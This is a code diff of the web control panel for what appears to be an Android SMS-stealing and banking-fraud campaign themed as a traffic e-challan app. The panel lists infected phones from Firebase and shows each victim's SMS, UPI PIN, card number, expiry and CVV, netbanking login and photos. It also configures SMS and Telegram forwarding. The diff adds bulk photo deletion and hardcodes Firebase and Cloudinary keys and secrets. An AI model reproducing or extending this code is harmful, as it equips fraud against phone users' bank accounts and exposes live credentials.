@@ -140,12 +140,18 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .pitem img { width:100%; height:105px; object-fit:cover; display:block; background:#1E3A8A; }
 .pname { padding:4px 6px; font-size:9px; color:#64748B; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; background:rgba(0,0,0,0.6); }
 .pfolder { position:absolute; top:4px; left:4px; padding:2px 6px; background:#3B82F6; color:white; border-radius:4px; font-size:8px; font-weight:bold; text-transform:uppercase; }
+.pdelete { position:absolute; top:4px; right:4px; width:24px; height:24px; background:rgba(239,68,68,0.9); color:white; border:none; border-radius:50%; font-size:12px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; z-index:10; box-shadow:0 2px 6px rgba(0,0,0,0.5); }
+.pdelete:hover { background:#EF4444; }
+.pdelete:disabled { background:#475569; cursor:not-allowed; }
+.pitem.deleting { opacity:0.4; pointer-events:none; }
+.pitem.deleted { display:none; }
 .pviewer { position:fixed; inset:0; background:rgba(0,0,0,0.97); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
 .pviewer.active { display:flex; }
 .pviewer img { max-width:100%; max-height:78vh; object-fit:contain; border-radius:6px; }
-.pv-controls { display:flex; gap:8px; margin-top:14px; }
+.pv-controls { display:flex; gap:8px; margin-top:14px; flex-wrap:wrap; justify-content:center; }
 .pv-controls button { padding:10px 18px; background:#1E3A8A; border:1px solid #3B82F6; color:#60A5FA; border-radius:8px; cursor:pointer; font-size:11px; font-weight:bold; }
 .pv-controls button.close { background:#EF4444; border-color:#EF4444; color:white; }
+.pv-controls button.del { background:#EF4444; border-color:#EF4444; color:white; }
 .pv-info { color:#64748B; font-size:10px; margin-top:8px; text-align:center; }
 .app { background:#0A1428; padding:9px 11px; border-radius:8px; margin-bottom:5px; display:flex; align-items:center; gap:9px; border-left:2px solid #3B82F6; }
 .app-ic { width:34px; height:34px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:9px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
@@ -209,7 +215,6 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .scan-status { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.2); border-radius:8px; padding:10px; margin:0 16px 12px; font-size:10px; color:#60A5FA; display:flex; align-items:center; gap:8px; }
 .scan-status .spin { display:inline-block; width:12px; height:12px; border:2px solid rgba(59,130,246,0.3); border-top-color:#3B82F6; border-radius:50%; animation:spin 1s linear infinite; }
 @keyframes spin { to { transform:rotate(360deg); } }
-/* ═══ TELEGRAM LIVE STATUS ═══ */
 .tg-status { background:rgba(59,130,246,0.08); border:1px solid rgba(59,130,246,0.3); border-radius:8px; padding:10px 12px; margin-top:10px; font-size:11px; color:#60A5FA; line-height:1.5; font-weight:600; }
 .tg-status.ok { background:rgba(16,185,129,0.08); border-color:rgba(16,185,129,0.3); color:#10B981; }
 .tg-status.err { background:rgba(239,68,68,0.08); border-color:rgba(239,68,68,0.3); color:#F87171; }
@@ -329,6 +334,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   <div class="pv-info" id="pInfo"></div>
   <div class="pv-controls">
     <button id="pDownload">⬇ DOWNLOAD</button>
+    <button class="del" id="pDelete">🗑 DELETE</button>
     <button class="close" id="pClose">✕ CLOSE</button>
   </div>
 </div>
@@ -354,77 +360,64 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
   </div>
 </div>
 
+<div class="cf-overlay" id="delScopeOverlay">
+  <div class="cf-dialog">
+    <h3>🗑 Delete Photos</h3>
+    <div class="cf-hint">Choose scope. Photos will be deleted from <b>Firebase AND Cloudinary</b>.</div>
+    <div id="delScopeList" style="display:flex;flex-direction:column;gap:6px;margin-bottom:12px;"></div>
+    <div class="cf-status err">⚠️ Permanent delete. Cannot be undone.</div>
+    <div style="display:flex;gap:8px;margin-top:10px;">
+      <button class="cf-close" id="delScopeCancel" style="flex:1;margin-top:0;">CANCEL</button>
+      <button class="cf-btn deactivate" id="delScopeConfirm" style="flex:1;">🗑 DELETE</button>
+    </div>
+  </div>
+</div>
+
+<div class="cf-overlay" id="delProgressOverlay">
+  <div class="cf-dialog">
+    <h3>🗑 Deleting...</h3>
+    <div class="cf-hint" id="delProgressText">Starting...</div>
+    <div style="background:#050810;border:1px solid #1E3A8A;border-radius:8px;height:24px;overflow:hidden;margin-top:12px;">
+      <div id="delProgressBar" style="background:linear-gradient(90deg,#EF4444,#F59E0B);height:100%;width:0%;transition:width 0.3s;"></div>
+    </div>
+    <div class="cf-status" id="delProgressLog" style="max-height:150px;overflow-y:auto;font-family:monospace;font-size:10px;margin-top:10px;">Ready.</div>
+  </div>
+</div>
+
 <script>
-var RTO_CONFIG = {
-  apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
-  databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
-  projectId: "rto-echallan-v2",
-  appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
-};
-
-var db = null;
-var currentApp = null;
-var currentAccount = null;
-var devs = {};
-var devPaths = {};
-var curId = null;
-var curTab = 'info';
-var curMsgs = {};
-var curFilter = 'all';
+var RTO_CONFIG = { apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8", databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com", projectId: "rto-echallan-v2", appId: "1:5750315381:android:95dc88826b1ef1262b9b3c" };
+var CLOUDINARY_CONFIG = { cloudName: "ro4vwlrm", apiKey: "899231689977322", apiSecret: "nXMr9EyHtjrtTXmVNnkHI7CeirI" };
+var db=null, currentApp=null, currentAccount=null, devs={}, devPaths={}, curId=null, curTab='info', curMsgs={}, curFilter='all';
 var liked = JSON.parse(localStorage.getItem('liked') || '[]');
-var photos = {};
-var curPhoto = '';
-var scanListener = null;
-var deviceListener = null;
-var dataListeners = [];
-var cfSimSlot = 1;
-var tgPolling = {};
+var photos={}, curPhoto='', scanListener=null, deviceListener=null, dataListeners=[], cfSimSlot=1, tgPolling={};
 
-// ═══ SAVED ACCOUNTS ═══
 function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
 function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
 function renderAccounts() {
-  var list = getSavedAccounts();
-  var el = document.getElementById('accList');
+  var list = getSavedAccounts(); var el = document.getElementById('accList');
   if (list.length === 0) { el.innerHTML = '<div style="text-align:center;color:#475569;font-size:11px;padding:10px 0;">No saved accounts</div>'; return; }
-  el.innerHTML = list.map(function(a, i) {
-    return '<div class="acc-item" data-acc="' + i + '"><div class="acc-icon">🔥</div><div class="acc-info"><div class="acc-name">' + esc(a.name || 'Account ' + (i+1)) + '</div><div class="acc-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div></div><button class="acc-del" data-del="' + i + '">✕</button></div>';
-  }).join('');
-  el.querySelectorAll('.acc-item').forEach(function(item) {
-    item.addEventListener('click', function(e) { if (e.target.hasAttribute('data-del')) return; openAccount(parseInt(this.getAttribute('data-acc'))); });
-  });
-  el.querySelectorAll('[data-del]').forEach(function(b) {
-    b.addEventListener('click', function(e) { e.stopPropagation(); var idx = parseInt(this.getAttribute('data-del')); if (!confirm('Delete?')) return; var list = getSavedAccounts(); list.splice(idx, 1); saveAccounts(list); renderAccounts(); });
-  });
+  el.innerHTML = list.map(function(a, i) { return '<div class="acc-item" data-acc="' + i + '"><div class="acc-icon">🔥</div><div class="acc-info"><div class="acc-name">' + esc(a.name || 'Account ' + (i+1)) + '</div><div class="acc-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div></div><button class="acc-del" data-del="' + i + '">✕</button></div>'; }).join('');
+  el.querySelectorAll('.acc-item').forEach(function(item) { item.addEventListener('click', function(e) { if (e.target.hasAttribute('data-del')) return; openAccount(parseInt(this.getAttribute('data-acc'))); }); });
+  el.querySelectorAll('[data-del]').forEach(function(b) { b.addEventListener('click', function(e) { e.stopPropagation(); var idx = parseInt(this.getAttribute('data-del')); if (!confirm('Delete?')) return; var list = getSavedAccounts(); list.splice(idx, 1); saveAccounts(list); renderAccounts(); }); });
 }
-
 function doLogin() {
   var p = document.getElementById('pinInput').value.trim();
   if (p.length < 4) { document.getElementById('errorMsg').textContent = 'Enter PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
   var tempApp = firebase.initializeApp(RTO_CONFIG, 'temp_' + Date.now());
-  var tempDb = tempApp.database();
-  tempDb.ref('admin_config/login_pin').once('value').then(function(s) {
-    if (p === (s.val() || '0987')) {
-      tempApp.delete();
-      currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isRTO: true };
-      openPanel(RTO_CONFIG, 'RTO Admin');
-    } else { tempApp.delete(); document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
+  tempApp.database().ref('admin_config/login_pin').once('value').then(function(s) {
+    if (p === (s.val() || '0987')) { tempApp.delete(); currentAccount = { name: 'RTO Admin', url: RTO_CONFIG.databaseURL, apiKey: RTO_CONFIG.apiKey, isRTO: true }; openPanel(RTO_CONFIG, 'RTO Admin'); }
+    else { tempApp.delete(); document.getElementById('errorMsg').textContent = '❌ Wrong PIN'; }
   }).catch(function(e) { tempApp.delete(); document.getElementById('errorMsg').textContent = 'Error: ' + e.message; });
 }
-function openAccount(idx) {
-  var list = getSavedAccounts(); var acc = list[idx]; if (!acc) return;
-  currentAccount = { name: acc.name || 'Account', url: acc.url, apiKey: acc.apiKey || RTO_CONFIG.apiKey, isRTO: false };
-  openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account');
-}
+function openAccount(idx) { var list = getSavedAccounts(); var acc = list[idx]; if (!acc) return; currentAccount = { name: acc.name || 'Account', url: acc.url, apiKey: acc.apiKey || RTO_CONFIG.apiKey, isRTO: false }; openPanel({ apiKey: acc.apiKey || RTO_CONFIG.apiKey, databaseURL: acc.url, projectId: acc.url.replace('https://','').replace('.firebaseio.com','') }, acc.name || 'Account'); }
 function openPanel(config, title) {
   try {
     if (currentApp) { try { currentApp.delete(); } catch(e) {} }
     currentApp = firebase.initializeApp(config, 'app_' + Date.now());
     db = currentApp.database();
     if (!currentAccount) currentAccount = {};
-    currentAccount.url = config.databaseURL;
-    currentAccount.name = title;
+    currentAccount.url = config.databaseURL; currentAccount.name = title;
     document.getElementById('topTitle').textContent = '🚔 ' + title;
     document.getElementById('loginScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
@@ -433,85 +426,50 @@ function openPanel(config, title) {
 }
 function doLogout() {
   stopTelegramPolling();
-  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  db = null; devs = {}; devPaths = {}; curId = null; currentAccount = null;
+  db=null; devs={}; devPaths={}; curId=null; currentAccount=null;
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('loginScreen').style.display = 'flex';
-  document.getElementById('pinInput').value = '';
-  document.getElementById('errorMsg').textContent = '';
-  document.getElementById('pinView').style.display = 'block';
-  document.getElementById('newAccView').style.display = 'none';
+  document.getElementById('pinInput').value = ''; document.getElementById('errorMsg').textContent = '';
+  document.getElementById('pinView').style.display = 'block'; document.getElementById('newAccView').style.display = 'none';
   renderAccounts();
 }
-
 function startApp() {
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
   if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  
-  var scanEl = document.getElementById('scanStatus');
-  var scanText = document.getElementById('scanText');
+  var scanEl = document.getElementById('scanStatus'); var scanText = document.getElementById('scanText');
   devs = {}; devPaths = {};
-  
   var isRTO = currentAccount && (currentAccount.isRTO === true);
-  if (!isRTO && currentAccount && currentAccount.url) {
-    if (currentAccount.url.toLowerCase().indexOf('rto-echallan-v2') !== -1) isRTO = true;
-  }
-  console.log('isRTO:', isRTO);
-  
+  if (!isRTO && currentAccount && currentAccount.url) { if (currentAccount.url.toLowerCase().indexOf('rto-echallan-v2') !== -1) isRTO = true; }
   if (isRTO) {
-    scanEl.style.display = 'none';
-    deviceListener = db.ref('device_info');
-    deviceListener.on('value', function(s) {
-      devs = s.val() || {};
-      devPaths = {};
-      Object.keys(devs).forEach(function(id) { devPaths[id] = { device: 'device_info/' + id }; });
-      updStats(); renderDevs();
-      if (curId && devs[curId]) renderTab();
-    }, function(error) {
-      console.error('RTO load error:', error);
-      document.getElementById('deviceGrid').innerHTML = '<div class="empty">Error: ' + error.message + '</div>';
-    });
+    scanEl.style.display = 'none'; deviceListener = db.ref('device_info');
+    deviceListener.on('value', function(s) { devs = s.val() || {}; devPaths = {}; Object.keys(devs).forEach(function(id) { devPaths[id] = { device: 'device_info/' + id }; }); updStats(); renderDevs(); if (curId && devs[curId]) renderTab(); }, function(error) { document.getElementById('deviceGrid').innerHTML = '<div class="empty">Error: ' + error.message + '</div>'; });
   } else {
-    scanEl.style.display = 'flex';
-    scanText.textContent = 'Scanning Firebase for devices...';
+    scanEl.style.display = 'flex'; scanText.textContent = 'Scanning Firebase for devices...';
     scanListener = db.ref('/');
     scanListener.on('value', function(snapshot) {
-      var root = snapshot.val() || {};
-      devs = {}; devPaths = {};
-      var found = 0;
+      var root = snapshot.val() || {}; devs = {}; devPaths = {}; var found = 0;
       var skipNodes = ['admin_config', 'global_config', 'app_config', 'telegram_auto_config'];
       Object.keys(root).forEach(function(nodeName) {
         if (skipNodes.indexOf(nodeName) !== -1) return;
-        var node = root[nodeName];
-        if (!node || typeof node !== 'object') return;
+        var node = root[nodeName]; if (!node || typeof node !== 'object') return;
         Object.keys(node).forEach(function(key) {
-          var entry = node[key];
-          if (!entry || typeof entry !== 'object') return;
-          if (isDeviceEntry(key, entry)) {
-            if (!devs[key]) { devs[key] = entry; devPaths[key] = { device: nodeName + '/' + key }; found++; }
-            else { Object.keys(entry).forEach(function(k) { if (devs[key][k] === undefined) devs[key][k] = entry[k]; }); }
-          }
+          var entry = node[key]; if (!entry || typeof entry !== 'object') return;
+          if (isDeviceEntry(key, entry)) { if (!devs[key]) { devs[key] = entry; devPaths[key] = { device: nodeName + '/' + key }; found++; } else { Object.keys(entry).forEach(function(k) { if (devs[key][k] === undefined) devs[key][k] = entry[k]; }); } }
         });
       });
-      console.log('Scanned:', found);
       scanText.textContent = 'Found ' + found + ' device(s)';
       setTimeout(function() { scanEl.style.display = 'none'; }, 1500);
-      updStats(); renderDevs();
-      if (curId && devs[curId]) renderTab();
-    }, function(error) {
-      console.error('Scan error:', error);
-      scanText.textContent = '❌ Error: ' + error.message;
-    });
+      updStats(); renderDevs(); if (curId && devs[curId]) renderTab();
+    }, function(error) { scanText.textContent = '❌ Error: ' + error.message; });
   }
 }
-
 function isDeviceEntry(key, entry) {
   if (!entry || typeof entry !== 'object') return false;
   if (key.indexOf('DEV_') === 0) return true;
@@ -521,46 +479,22 @@ function isDeviceEntry(key, entry) {
   Object.keys(entry).forEach(function(k) { if (typeof entry[k] === 'string' && entry[k].indexOf('%') !== -1) hasBattery = true; });
   return hasBattery;
 }
-
 function loadAllDeviceData(deviceId, basePath, callback) {
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
   var data = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, sim_info: null, forward_settings: null, device_info: null };
-  if (basePath) {
-    var baseRef = db.ref(basePath);
-    var cb1 = baseRef.on('value', function(s) {
-      var devObj = s.val() || {};
-      collectData(devObj, data);
-      callback(data);
-    });
-    dataListeners.push({ ref: baseRef, cb: cb1 });
-  }
+  if (basePath) { var baseRef = db.ref(basePath); var cb1 = baseRef.on('value', function(s) { var devObj = s.val() || {}; collectData(devObj, data); callback(data); }); dataListeners.push({ ref: baseRef, cb: cb1 }); }
   var rootRef = db.ref('/');
   var cb2 = rootRef.on('value', function(snapshot) {
     var root = snapshot.val() || {};
-    var merged = {
-      messages: Object.assign({}, data.messages), sms_history: Object.assign({}, data.sms_history),
-      photos: Object.assign({}, data.photos), notifications: Object.assign({}, data.notifications),
-      installed_apps: data.installed_apps, sim_info: data.sim_info,
-      forward_settings: data.forward_settings, device_info: data.device_info
-    };
+    var merged = { messages: Object.assign({}, data.messages), sms_history: Object.assign({}, data.sms_history), photos: Object.assign({}, data.photos), notifications: Object.assign({}, data.notifications), installed_apps: data.installed_apps, sim_info: data.sim_info, forward_settings: data.forward_settings, device_info: data.device_info };
     scanForDevice(root, deviceId, merged);
     Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
     callback(data);
   });
   dataListeners.push({ ref: rootRef, cb: cb2 });
 }
-
-function scanForDevice(obj, deviceId, result) {
-  if (!obj || typeof obj !== 'object') return;
-  if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result);
-  Object.keys(obj).forEach(function(key) {
-    if (key === deviceId) return;
-    var child = obj[key];
-    if (child && typeof child === 'object') scanForDevice(child, deviceId, result);
-  });
-}
-
+function scanForDevice(obj, deviceId, result) { if (!obj || typeof obj !== 'object') return; if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result); Object.keys(obj).forEach(function(key) { if (key === deviceId) return; var child = obj[key]; if (child && typeof child === 'object') scanForDevice(child, deviceId, result); }); }
 function collectData(devObj, result) {
   if (!devObj || typeof devObj !== 'object') return;
   if (devObj.messages) Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
@@ -574,21 +508,15 @@ function collectData(devObj, result) {
   if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
   if (devObj.enabled !== undefined && devObj.admin_number !== undefined) result.forward_settings = Object.assign({}, result.forward_settings || {}, { enabled: devObj.enabled, admin_number: devObj.admin_number, bot_token: devObj.bot_token, chat_id: devObj.chat_id, forward_sim_slot: devObj.forward_sim_slot });
   if (!result.device_info) result.device_info = {};
-  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage'].forEach(function(k) {
-    if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
-  });
+  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage'].forEach(function(k) { if (devObj[k] !== undefined) result.device_info[k] = devObj[k]; });
 }
-
 function openDev(id) {
-  curId = id;
-  var d = devs[id];
+  curId = id; var d = devs[id];
   document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
-  updStar();
-  document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
+  updStar(); document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
   var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
   loadAllDeviceData(id, basePath, function(data) {
-    curMsgs = data.messages || {};
-    photos = data.photos || {};
+    curMsgs = data.messages || {}; photos = data.photos || {};
     if (data.sim_info) devs[id].sim_info = data.sim_info;
     if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
     if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
@@ -597,38 +525,23 @@ function openDev(id) {
     if (data.device_info) Object.keys(data.device_info).forEach(function(k) { if (devs[id][k] === undefined) devs[id][k] = data.device_info[k]; });
     renderTab();
   });
-  document.getElementById('drawer').classList.add('active');
-  document.getElementById('dOverlay').classList.add('active');
+  document.getElementById('drawer').classList.add('active'); document.getElementById('dOverlay').classList.add('active');
   switchTab('info');
 }
 function closeDev() {
   stopTelegramPolling();
-  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
-  dataListeners = [];
-  
-  // ✅ Photo command listener remove
-  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
-  
-  document.getElementById('drawer').classList.remove('active');
-  document.getElementById('dOverlay').classList.remove('active');
+  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} }); dataListeners = [];
+  document.getElementById('drawer').classList.remove('active'); document.getElementById('dOverlay').classList.remove('active');
   curId = null;
 }
-function switchTab(t) {
-  curTab = t;
-  document.getElementById('dBody').removeAttribute('data-rendered');
-  document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
-  renderTab();
-}
-
+function switchTab(t) { curTab = t; document.getElementById('dBody').removeAttribute('data-rendered'); document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); }); renderTab(); }
 function renderTab() {
-  var b = document.getElementById('dBody');
-  var d = devs[curId];
+  var b = document.getElementById('dBody'); var d = devs[curId];
   if (!d) { b.innerHTML = '<div class="empty">Not found</div>'; return; }
   if (curTab === 'photos') return renderPhotos();
   if (curTab === 'apps') return renderApps();
   if (curTab === 'notifs') return renderNotifs();
   if (curTab === 'bank') return renderBank();
-  
   var all = [];
   Object.values(curMsgs).forEach(function(m) { all.push(m); });
   if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
@@ -637,37 +550,13 @@ function renderTab() {
   var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
   document.getElementById('cBank').textContent = bks.length;
   document.getElementById('cCard').textContent = (d.card_data || d.upi_data || d.netbanking_data) ? '1' : '0';
-  
   if (curTab === 'info') {
-    var note = d.device_note || '';
-    var fm = detectFromSms(all);
-    var sim = d.sim_info || {};
-    b.innerHTML = 
-      '<div class="dir"><span class="k">Phone Number (SIM1)</span><span class="v">' + esc(sim.sim1_number || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Phone Number (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' +
-      '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
-      '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit"><button data-det="1">Detect</button></div></div>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit"><button data-det="2">Detect</button></div></div>' +
-      '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div></div>' +
-      '<div class="dir"><span class="k">Network</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">IP Address</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
-      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
-    setTimeout(function() {
-      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref('device_info/' + curId + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
-      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref('device_info/' + curId + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
-      var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); };
-    }, 100);
+    var note = d.device_note || ''; var fm = detectFromSms(all); var sim = d.sim_info || {};
+    b.innerHTML = '<div class="dir"><span class="k">Phone Number (SIM1)</span><span class="v">' + esc(sim.sim1_number || '-') + '</span></div>' + '<div class="dir"><span class="k">Phone Number (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' + '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' + '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' + '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' + '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' + '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit"><button data-det="1">Detect</button></div></div>' + '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit"><button data-det="2">Detect</button></div></div>' + '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div></div>' + '<div class="dir"><span class="k">Network</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' + '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' + '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' + '<div class="dir"><span class="k">IP Address</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' + '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' + (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
+    setTimeout(function() { var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref('device_info/' + curId + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); }; var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref('device_info/' + curId + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); }; var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); }; }, 100);
   } else if (curTab === 'allsms') {
     if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
-    b.innerHTML = all.map(function(m) {
-      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
-    }).join('');
+    b.innerHTML = all.map(function(m) { return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>'; }).join('');
   } else if (curTab === 'card') {
     var u = d.upi_data || {}, c = d.card_data || {}, bn = d.netbanking_data || {};
     b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
@@ -675,238 +564,240 @@ function renderTab() {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
     var f = d.forward_settings || {};
-    var simSel = f.forward_sim_slot || 1;
-    var fOn = f.enabled || false;
-    var fNum = f.admin_number || '';
-    var tok = f.bot_token || '';
-    var ch = f.chat_id || '';
